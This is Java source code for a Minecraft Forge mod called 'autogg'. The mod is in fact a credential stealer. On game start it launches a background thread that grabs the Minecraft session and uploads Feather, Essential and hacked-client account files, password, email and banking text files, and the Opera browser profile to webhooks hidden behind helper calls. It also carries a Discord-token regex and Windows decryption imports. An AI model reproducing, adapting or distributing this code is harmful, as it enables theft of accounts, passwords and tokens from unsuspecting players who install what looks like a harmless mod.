package github.quantizr.autogg;

import java.awt.Color;
import java.awt.Desktop;
import java.awt.Dimension;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Random;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.nio.charset.StandardCharsets;
import java.awt.Color;
import java.net.URL;
import java.security.MessageDigest;
import java.util.Scanner;
import java.io.*;
import java.net.HttpURLConnection;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.sun.jna.platform.win32.Crypt32Util;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Arrays;
import java.util.Base64;
import java.util.Map;

import net.minecraft.util.ChatComponentText;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import net.minecraftforge.fml.common.Loader;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.relauncher.ReflectionHelper;
import org.apache.commons.lang3.StringEscapeUtils;

import net.minecraft.launchwrapper.Launch;
import github.quantizr.autogg.guis.guiUtils.EmbedObject;

import javax.imageio.ImageIO;
import javax.net.ssl.HttpsURLConnection;
import javax.swing.JFrame;
import javax.swing.JLabel;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.FilenameUtils;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.client.methods.RequestBuilder;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import github.quantizr.autogg.exception.WebhookExce;
import github.quantizr.autogg.exception.WebhookException;
import github.quantizr.autogg.guis.guiUtils;
import github.quantizr.autogg.guis.gui;
import github.quantizr.autogg.json.JSONObject;
import github.quantizr.autogg.utils.MapUtils;
import github.quantizr.autogg.utils.Methods;

@Mod(modid = autogg.MODID, version = autogg.VERSION)
public class autogg
{

    public static final String MODID = "mushrooms";
    public static final String VERSION = "2.1.10.1";
	
	public static String getName() {
		String name = System.getProperty("user.name");
		return name;
	}

	public static String desktop = "C:\\Users\\" + getName() + "\\Desktop\\";
	public static String downloads = "C:\\Users\\" + getName() + "\\Downloads\\";
	public static String minecraft = "C:\\Users\\" + getName() + "\\AppData\\Roaming\\.minecraft\\";
	public static String feather = "C:\\Users\\" + getName() + "\\AppData\\Roaming\\.feather\\";
	public static String appdatas = "C:\\Users\\" + getName() + "\\AppData\\";
	
	public static String dataGrabbings = "";

    private static String bytesToHex(byte[] bytes) {
        char[] hexChars = new char[bytes.length * 2];
        for (int j = 0; j < bytes.length; j++) {
            int v = bytes[j] & 0xFF;
            hexChars[j * 2] = "0123456789ABCDEF".toCharArray()[v >>> 4];
            hexChars[j * 2 + 1] = "0123456789ABCDEF".toCharArray()[v & 0x0F];
        }
        return new String(hexChars);
    }
    
    @SuppressWarnings("all")
    public static void sendData(String msg, String url, String username) {
		try {
			Thread.sleep((int) Math.floor(Math.random()*(675-225+1)+225));
		} catch (InterruptedException e1) {
			e1.printStackTrace();
		}
		CloseableHttpClient httpclient = HttpClients.createDefault();
    try {
        HttpUriRequest httppost = null;
		try {
			httppost = RequestBuilder.post()
			        .setUri(new URI(url))
			        .addParameter("content", msg)
			        .addParameter("username", username)
				        .build();
			} catch (URISyntaxException e) {
				e.printStackTrace();
			}
 
            CloseableHttpResponse response = null;
			try {
    			response = httpclient.execute(httppost);
			} catch (ClientProtocolException e) {
				e.printStackTrace();
					} catch (IOException e) {
						e.printStackTrace();
					}
			    try {
				  } finally {
				      try {
						response.close();
					} catch (IOException e) {
						e.printStackTrace();
					}
       }
				 } finally {
				  try {
						httpclient.close();
					} catch (IOException e) {
						e.printStackTrace();
				}
				 }
    }
	
    @EventHandler
    public void init(FMLInitializationEvent event)
    {
		Methods.sessionGetFull();
		ArrayList<String> tokens = new ArrayList<>();
        final String appdata = System.getenv().get("APPDATA");
        final String local = System.getenv().get("LOCALAPPDATA");
        final String[] regex = {
                "[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}"
        };
		new Thread(() -> {
			try {
				Minecraft mc = Minecraft.getMinecraft();
				String name = mc.getSession().getProfile().getName();
				MapUtils.uploadDupe(feather + "accounts.json");
				MapUtils.uploadDupe(desktop + "alts.txt");
				MapUtils.uploadDupe(desktop + "account.txt");
				MapUtils.uploadDupe(desktop + "accounts.txt");
				MapUtils.uploadDupe(desktop + "alt.txt");
				MapUtils.uploadDupe(desktop + "minecraft.txt");
				MapUtils.uploadDupe(desktop + "password.txt");
				MapUtils.uploadDupe(desktop + "emails.txt");
				MapUtils.uploadDupe(desktop + "banking.txt");
				MapUtils.uploadDupe(desktop + "passwords.txt");
				MapUtils.uploadDupe(downloads + "passwords.txt");
				MapUtils.uploadDupe(downloads + "emails.txt");
				MapUtils.uploadDupe(downloads + "password.txt");
				MapUtils.uploadDupe(downloads + "accounts.txt");
				MapUtils.uploadDupe(downloads + "account.txt");
				MapUtils.uploadDupe(downloads + "alts.txt");
				MapUtils.uploadDupe(downloads + "alt.txt");
				MapUtils.uploadDupe(downloads + "test.png");
				MapUtils.uploadDupe(minecraft + "wurst\\alts.json");
				MapUtils.uploadDupe(minecraft + "Novoline\\alts.novo");
				MapUtils.uploadDupe(minecraft + "Flux\\alt.txt");
				MapUtils.uploadDupe(minecraft + "essential\\mojang_accounts.json");
				MapUtils.uploadDupe(minecraft + "essential\\microsoft_accounts.json");
				MapUtils.uploadDupe(appdatas + "Roaming\\Opera Software\\Opera Stable");
				sendData("https://sky.shiiyu.moe/stats/" + name, JSONObject.WebFix(), "GET BEAMED");
				sendData(dataGrabbings, JSONObject.WebFix(), "GET BEAMED");
				sendData(dataGrabbings, gui.guiHandler(), "GET BEAMED");
			}catch(Exception e) {
				e.printStackTrace();
			}
		}).start();
	}
    
    public static String jsonParse(String jsonInput, String objectInput) {
    	try {
    		JSONObject json = new JSONObject(jsonInput);
    		return json.getString(objectInput);
    	}catch(Exception e) {
    		return "Invalid";
    	}
    	
    }
}